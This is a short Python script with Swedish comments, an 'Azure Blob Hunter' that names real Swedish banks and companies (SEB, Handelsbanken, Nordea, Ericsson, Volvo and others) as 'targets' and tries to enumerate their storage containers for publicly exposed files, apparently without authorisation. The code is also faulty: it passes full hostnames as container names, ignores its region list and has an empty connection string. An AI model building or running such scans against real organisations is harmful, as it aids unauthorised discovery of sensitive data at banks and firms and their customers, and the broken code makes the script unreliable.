import azure.storage.blob as azureblob
from azure.core.exceptions import ResourceExistsError
import os

# Din Azure Connection String (få från Azure Portal)
AZURE_CONNECTION = "DefaultEndpointsProtocol=https;AccountName=;AccountKey=;EndpointSuffix=core.windows.net"

# Svenska enterprise targets (samma som AWS)
SWEDISH_ENTERPRISE = [
    "seb-se", "seb-bank", "seb-prod", "seb-uploads",
    "handelsbanken-se", "handelsbanken", "swedbank-se", 
    "nordea-se", "nordea", "volvo-se", "volvo-cars",
    "ericsson-se", "ericsson", "scania-se", "ikea-se"
]

AZURE_REGIONS = [
    "eastus", "westus2", "northeurope", "westeurope",
    "francecentral", "germanywestcentral", "uksouth"
]

def scan_blob_containers(account_name, connection_string):
    blob_service = azureblob.BlobServiceClient.from_connection_string(connection_string)
    
    print(f"🎯 AZURE BLOB HUNTER - {account_name}")
    print(f"🌍 Scanning {len(AZURE_REGIONS)} regions...\n")
    
    for target in SWEDISH_ENTERPRISE:
        container_name = f"{target}.blob.core.windows.net"
        try:
            container_client = blob_service.get_container_client(container_name)
            blobs = container_client.list_blobs()
            blob_count = sum(1 for _ in blobs)
            if blob_count > 0:
                print(f"🚨🚨 {container_name} - {blob_count} PUBLIC FILES!")
            else:
                print(f"⚪ {container_name} - 404")
        except:
            print(f"⚪ {container_name} - No access")

print("=== 🟦 AZURE BLOB MULTIVERSE v1 ===")
print("🔍 Swedish Enterprise + Global Coverage")

# Testa kända Azure targets
scan_blob_containers("sebse", AZURE_CONNECTION)
scan_blob_containers("handelsbanken", AZURE_CONNECTION)
scan_blob_containers("ericsson", AZURE_CONNECTION)
